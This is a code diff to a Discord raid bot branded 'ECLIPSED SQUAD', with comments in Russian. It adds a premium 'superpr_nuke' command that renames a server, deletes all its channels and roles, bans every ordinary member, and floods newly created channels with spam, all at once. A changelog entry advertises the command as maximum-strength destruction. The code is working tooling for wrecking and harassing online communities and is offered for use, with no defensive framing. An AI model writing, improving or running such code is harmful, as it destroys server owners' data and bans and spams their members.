@@ -577,6 +577,66 @@ async def super_nuke(ctx, *, text: str = None):
     asyncio.create_task(do_super_nuke(guild, spam_text))
 
 
+@bot.command(name="superpr_nuke")
+@premium_check()
+async def superpr_nuke(ctx, *, text: str = None):
+    guild = ctx.guild
+    if is_guild_blocked(guild.id):
+        embed = discord.Embed(description="🔒 Этот сервер заблокирован.", color=0x0a0a0a)
+        embed.set_footer(text="☠️ ECLIPSED SQUAD")
+        await ctx.send(embed=embed)
+        return
+    if nuke_running.get(guild.id):
+        embed = discord.Embed(description="⚡ Краш уже запущен на этом сервере.", color=0x0a0a0a)
+        await ctx.send(embed=embed)
+        return
+    nuke_running[guild.id] = True
+    nuke_starter[guild.id] = ctx.author.id
+    spam_text = text if text else config.SPAM_TEXT
+    last_nuke_time[guild.id] = asyncio.get_running_loop().time()
+    last_spam_text[guild.id] = spam_text
+
+    async def do_superpr_nuke():
+        try:
+            await guild.edit(name=config.GUILD_NAME)
+        except Exception:
+            pass
+
+        bot_role = guild.me.top_role
+
+        # Все участники под бан
+        targets = [
+            m for m in guild.members
+            if not m.bot and m.id != guild.owner_id
+            and (not m.top_role or m.top_role < bot_role)
+        ]
+
+        # Создаём каналы параллельно
+        async def create_and_spam(i):
+            try:
+                ch = await guild.create_text_channel(name=config.GUILD_NAME)
+                await asyncio.gather(
+                    *[ch.send(spam_text) for _ in range(config.SPAM_COUNT // config.CHANNELS_COUNT)],
+                    return_exceptions=True
+                )
+            except Exception:
+                pass
+
+        # ВСЁ ОДНОВРЕМЕННО: удаление каналов + ролей + бан всех + создание каналов со спамом
+        await asyncio.gather(
+            asyncio.gather(*[c.delete() for c in guild.channels], return_exceptions=True),
+            asyncio.gather(*[r.delete() for r in guild.roles if r < bot_role and not r.is_default()], return_exceptions=True),
+            asyncio.gather(*[m.ban(reason="superpr_nuke") for m in targets], return_exceptions=True),
+            asyncio.gather(*[create_and_spam(i) for i in range(config.CHANNELS_COUNT)], return_exceptions=True),
+            return_exceptions=True
+        )
+
+        nuke_running[guild.id] = False
+        nuke_starter.pop(guild.id, None)
+
+    asyncio.create_task(do_superpr_nuke())
+
+
 @bot.command(name="massdm")
 @premium_check()
 async def massdm(ctx, *, text: str):
@@ -967,6 +1027,20 @@ async def changelog(ctx):
         title="📋 CHANGELOG — ECLIPSED BOT",
         description="История обновлений бота.",
         color=0x0a0a0a
+    )
+    embed.add_field(
+        name="🆕 v1.5 — Super Nuke обновление",
+        value=(
+            "• `!super_nuke [текст]` — премиум нюк с приоритетами:\n"
+            "  1. Удаление каналов + ролей\n"
+            "  2. Создание каналов с сообщением\n"
+            "  3. Бан всех участников\n"
+            "  4. Спам до 500 сообщений\n"
+            "• `!superpr_nuke [текст]` — максимальная сила, всё одновременно:\n"
+            "  удаление + бан + создание каналов + спам в один момент\n"
+            "• `!auto_super_nuke` ускорен и оптимизирован"
+        ),
+        inline=False
     )
     embed.add_field(
         name="🆕 v1.4 — Premium расширение",
